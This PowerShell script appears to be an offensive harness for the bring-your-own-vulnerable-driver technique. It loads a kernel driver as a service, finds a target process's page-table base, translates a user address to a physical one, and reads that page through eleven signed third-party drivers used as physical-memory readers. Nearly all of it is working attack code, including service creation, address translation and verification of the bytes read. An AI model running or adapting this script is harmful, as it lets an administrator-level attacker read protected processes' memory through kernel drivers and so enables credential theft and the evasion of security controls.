# Read arbitrary EXE memory through each of the 11 physical-read drivers.
#
# Key difference from safe_11_cr3:
#   - It translates a TARGET USER VA (e.g. cmd.exe image base) with the target
#     process's own CR3. KVA-shadow kernel-VA translation is NOT needed.
#   - KKYUM only locates the target CR3 (kernel-VA walk).
#   - Each physical driver reads the translated physical page once.
#
# Usage:
#   pwsh -File scripts\read_exe_via_11_phys.ps1 -StaticOnly
#   pwsh -File scripts\read_exe_via_11_phys.ps1 -DryRun
#   # elevated:
#   pwsh -File scripts\read_exe_via_11_phys.ps1 -OnlyBackend gibepext
#   pwsh -File scripts\read_exe_via_11_phys.ps1
param(
    [switch]$StaticOnly,
    [switch]$DryRun,
    [int]$ProcessId = 0,
    [string]$ProcessName = 'cmd.exe',
    [string]$Va = '',
    [int]$Size = 0x40,
    [string]$OnlyBackend = '',
    [switch]$SkipCompare,
    [switch]$KeepTarget,
    [switch]$KeepDriver
)

$ErrorActionPreference = 'Stop'
$base = Split-Path $PSScriptRoot -Parent
$membridge = Join-Path $base 'bin\membridge.exe'
$layers = Join-Path $base 'bin\layers.exe'
$kkyum = Join-Path $base 'drivers\KKYUM\KKYUM.sys'
$outJson = Join-Path $base 'evidence\read_exe_via_11_phys.json'

$backends = @(
    'cchwapi_2_9', 'cchwapi_2_12', 'cchwapi_ext_4_5',
    'hp_swtools', 'swtoolsdriver', 'hp_swtools_v1', 'isharepp',
    'gibepext', 'gibepext2', 'tdeio', 'ufu_win10'
)
$driverPaths = @{
    'cchwapi_2_9'     = 'drivers\CCHWApi_sys\CCHWApi.sys'
    'cchwapi_2_12'    = 'drivers\CCHWApi(1)_sys\CCHWApi(1).sys'
    'cchwapi_ext_4_5' = 'drivers\CCHWApiExt(1)_sys\CCHWApiExt(1).sys'
    'hp_swtools'      = 'drivers\HP SW TOOLS DRIVER_sys\HP SW TOOLS DRIVER.sys'
    'swtoolsdriver'   = 'drivers\swtoolsdriver\swtoolsdriver.sys'
    'hp_swtools_v1'   = 'drivers\hp_swtools_v1\HP_SWTOOLS_DRIVER_V1.sys'
    'isharepp'        = 'drivers\isharepp\iSharePp.sys'
    'gibepext'        = 'drivers\gibepext\gibepext.sys'
    'gibepext2'       = 'drivers\gibepext2\gibepext2.sys'
    'tdeio'           = 'drivers\tdeio\TdeIo64.sys'
    'ufu_win10'       = 'drivers\ufu\win10_ufudev64.sys'
}

if ($OnlyBackend) {
    if ($backends -notcontains $OnlyBackend) { throw "unknown -OnlyBackend; use: $($backends -join ',')" }
    $backends = @($OnlyBackend)
}
foreach ($p in @($membridge,$layers,$kkyum)) {
    if (-not (Test-Path -LiteralPath $p)) { throw "missing: $p" }
}

Write-Host "== read arbitrary EXE memory through physical drivers =="
Write-Host "backends: $($backends.Count)"

if ($StaticOnly) {
    $rows = @()
    foreach ($bid in $backends) {
        $path = Join-Path $base $driverPaths[$bid]
        $exists = Test-Path -LiteralPath $path
        $sig = if ($exists) { (Get-AuthenticodeSignature -LiteralPath $path).Status.ToString() } else { 'MISSING' }
        $rows += [pscustomobject]@{ backend=$bid; exists=$exists; signature=$sig }
    }
    $ls = (& $membridge --locate-selftest 2>&1 | Out-String)
    $rows | Format-Table -AutoSize
    $report = [pscustomobject]@{
        mode='static'
        kkyum=(Get-AuthenticodeSignature -LiteralPath $kkyum).Status.ToString()
        locate_selftest=if ($ls -match 'VERDICT=PASS') {'PASS'} else {'FAIL'}
        backends=$rows
    }
    $report | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $outJson -Encoding UTF8
    if (@($rows | Where-Object { -not $_.exists -or $_.signature -ne 'Valid' }).Count -eq 0 -and $report.locate_selftest -eq 'PASS') {
        Write-Host "STATIC_ONLY=PASS"; exit 0
    }
    exit 2
}

if ($DryRun) {
    Write-Host "1) get target PEB/ImageBase (user-mode) or use -Va"
    Write-Host "2) sc create/start KKYUM; layers --locate --kkyum --pid <pid> -> target CR3"
    Write-Host "3) layers --translate-only --reader legacy --legacy-backend tdeio --cr3 <targetCR3> --va <userVA> -> PA"
    Write-Host "4) for each physical backend: membridge --backend <id> --pa <PA> --size <n> --dump"
    Write-Host "DRY_RUN=PASS"; exit 0
}

$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($id)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[BLOCKED] Administrator required to load KKYUM and physical drivers." -ForegroundColor Yellow
    exit 2
}

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class MbUserRead {
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr read);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr h, int cls, ref PROCESS_BASIC_INFORMATION pbi, int len, out int ret);
}
'@

function Get-UserTargetInfo([int]$TargetPid) {
    $h = [MbUserRead]::OpenProcess(0x0410, $false, $TargetPid)  # QUERY_INFORMATION | VM_READ
    if ($h -eq [IntPtr]::Zero) { throw "OpenProcess failed (cross-user/protected target); pass -Va explicitly" }
    try {
        $pbi = New-Object MbUserRead+PROCESS_BASIC_INFORMATION
        $ret = 0
        $st = [MbUserRead]::NtQueryInformationProcess($h, 0, [ref]$pbi, [Runtime.InteropServices.Marshal]::SizeOf($pbi), [ref]$ret)
        if ($st -ne 0) { throw ("NtQueryInformationProcess=0x{0:X8}" -f $st) }
        $peb = $pbi.PebBaseAddress.ToInt64()
        $ib = New-Object byte[] 8
        $got = [IntPtr]::Zero
        [void][MbUserRead]::ReadProcessMemory($h, [IntPtr]($peb + 0x10), $ib, [IntPtr]8, [ref]$got)
        $imageBase = [BitConverter]::ToInt64($ib, 0)
        return [pscustomobject]@{ handle=$h; peb=$peb; image_base=$imageBase }
    } catch {
        [void][MbUserRead]::CloseHandle($h)
        throw
    }
}

function Read-UserBytes([IntPtr]$h, [uint64]$addr, [int]$size) {
    $buf = New-Object byte[] $size
    $got = [IntPtr]::Zero
    if (-not [MbUserRead]::ReadProcessMemory($h, [IntPtr]$addr, $buf, [IntPtr]$size, [ref]$got)) { return $null }
    return $buf
}

$startedTarget = $false
$service = 'MembridgeKKYUMReadExe'
$serviceCreated = $false
$targetInfo = $null
function Stop-Kkyum {
    if ($serviceCreated -and -not $KeepDriver) {
        & sc.exe stop $service *> $null
        Start-Sleep -Milliseconds 300
        & sc.exe delete $service *> $null
    }
}

try {
    if ($ProcessId -le 0) {
        $procRoot = $ProcessName -replace '\.exe$',''
        $proc = Get-Process -Name $procRoot -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $proc) {
            $exe = Join-Path $env:SystemRoot ("System32\{0}" -f $ProcessName)
            $proc = Start-Process -FilePath $exe -ArgumentList '/k','title ReadExeTarget' -PassThru
            $startedTarget = $true
            Start-Sleep -Milliseconds 600
        }
        $ProcessId = $proc.Id
    }
    Write-Host "target PID=$ProcessId"

    if (-not $Va) {
        $targetInfo = Get-UserTargetInfo -TargetPid $ProcessId
        $targetVa = [uint64]$targetInfo.image_base
        Write-Host ("PEB=0x{0:X} ImageBase=0x{1:X}" -f $targetInfo.peb, $targetVa)
    } else {
        $targetVa = [Convert]::ToUInt64($Va, 16)
        try { $targetInfo = Get-UserTargetInfo -TargetPid $ProcessId } catch { Write-Host "[WARN] no user-mode read access; use -SkipCompare" }
    }

    $pageRemain = 0x1000 - ($targetVa -band 0xFFF)
    if ($Size -gt $pageRemain) { $Size = [int]$pageRemain }
    Write-Host ("VA=0x{0:X} size=0x{1:X}" -f $targetVa, $Size)

    $baseline = $null
    if ($targetInfo -and -not $SkipCompare) {
        $baseline = Read-UserBytes $targetInfo.handle $targetVa $Size
        if ($baseline) { Write-Host ("baseline=" + (($baseline | ForEach-Object { $_.ToString('X2') }) -join ' ')) }
        else { Write-Host "[WARN] baseline ReadProcessMemory failed; comparing only length" }
    }

    Write-Host ">> loading KKYUM..."
    & sc.exe create $service binPath= $kkyum type= kernel start= demand *> $null
    if ($LASTEXITCODE -eq 0) { $serviceCreated = $true }
    & sc.exe start $service *> $null
    Start-Sleep -Milliseconds 500
    $loc = (& $layers --locate --kkyum --pid $ProcessId 2>&1 | Out-String)
    Write-Host $loc
    $mCr3 = [regex]::Match($loc, 'CR3=(0x[0-9A-Fa-f]+)')
    if (-not $mCr3.Success) { throw "KKYUM locate failed" }
    $targetCr3 = $mCr3.Groups[1].Value
    Write-Host "target CR3=$targetCr3"

    Write-Host ">> translate target USER VA with target CR3 (no kernel-VA translation)"
    $old = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    $translateReaders = @('tdeio','gibepext','gibepext2')
    $usedReader = ''
    $mPa = $null
    $t = ''
    foreach ($rb in $translateReaders) {
        foreach ($tryLa57 in @($false,$true)) {
            $la57 = $tryLa57
            $a = @('--translate-only','--reader','legacy','--legacy-backend',$rb,
                   '--cr3',$targetCr3,'--va',('0x{0:X}' -f $targetVa))
            if ($la57) { $a += '--la57' }
            $t = (& $layers @a 2>&1 | Out-String)
            $mPa = [regex]::Match($t, 'PA=(0x[0-9A-Fa-f]+)')
            if ($mPa.Success) { $usedReader = $rb; break }
        }
        if ($mPa.Success) { break }
    }
    $ErrorActionPreference = $old
    Write-Host $t
    if (-not $mPa.Success) { throw "translate target USER VA failed" }
    $targetPa = [Convert]::ToUInt64($mPa.Groups[1].Value, 16)
    Write-Host ("target PA=0x{0:X} reader={1} la57={2}" -f $targetPa, $usedReader, $la57)

    $dumpsBefore = @(Get-ChildItem 'C:\Windows\Minidump' -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
    $rows = @()
    foreach ($bid in $backends) {
        Write-Host ">> $bid (one physical read of target page)"
        $out = (& $membridge --backend $bid --pa ('0x{0:X}' -f $targetPa) --size $Size --dump 2>&1 | Out-String)
        $hex = [regex]::Matches($out, '\b([0-9A-Fa-f]{2})\b') | ForEach-Object { $_.Groups[1].Value }
        $got = @()
        if ($hex.Count -ge $Size) {
            $got = @($hex | Select-Object -Last $Size | ForEach-Object { [Convert]::ToByte($_,16) })
        }
        $pass = $false
        if ($got.Count -eq $Size) {
            if ($baseline) {
                $pass = $true
                for ($i=0; $i -lt $Size; $i++) { if ($got[$i] -ne $baseline[$i]) { $pass = $false; break } }
            } else { $pass = $true }
        }
        $rows += [pscustomobject]@{
            backend=$bid
            verdict=if($pass){'PASS'}else{'FAIL'}
            pa=('0x{0:X}' -f $targetPa)
            bytes=(($got | ForEach-Object { $_.ToString('X2') }) -join ' ')
            output=$out.Trim()
        }
        Write-Host ("   => {0}" -f $rows[-1].verdict)
    }

    $dumpsAfter = @(Get-ChildItem 'C:\Windows\Minidump' -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
    $newDumps = @(Compare-Object $dumpsBefore $dumpsAfter | Where-Object { $_.SideIndicator -eq '=>' } | ForEach-Object { $_.InputObject })
    $passCount = @($rows | Where-Object { $_.verdict -eq 'PASS' }).Count
    $report = [pscustomobject]@{
        date=(Get-Date).ToString('s')
        target_pid=$ProcessId
        target_va=('0x{0:X}' -f $targetVa)
        target_cr3=$targetCr3
        target_pa=('0x{0:X}' -f $targetPa)
        translate_reader=$usedReader
        size=$Size
        total=$rows.Count
        pass=$passCount
        new_dumps=($newDumps -join ',')
        results=$rows
    }
    $report | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $outJson -Encoding UTF8
    $rows | Select-Object backend,verdict,bytes | Format-Table -AutoSize
    Write-Host ("RESULT: {0}/{1} drivers read target EXE memory -> {2}" -f $passCount,$rows.Count,$outJson)
} finally {
    Stop-Kkyum
    if ($targetInfo -and $targetInfo.handle) { [void][MbUserRead]::CloseHandle($targetInfo.handle) }
    if ($startedTarget -and -not $KeepTarget -and $ProcessId -gt 0) {
        Stop-Process -Id $ProcessId -Force -ErrorAction SilentlyContinue
    }
}
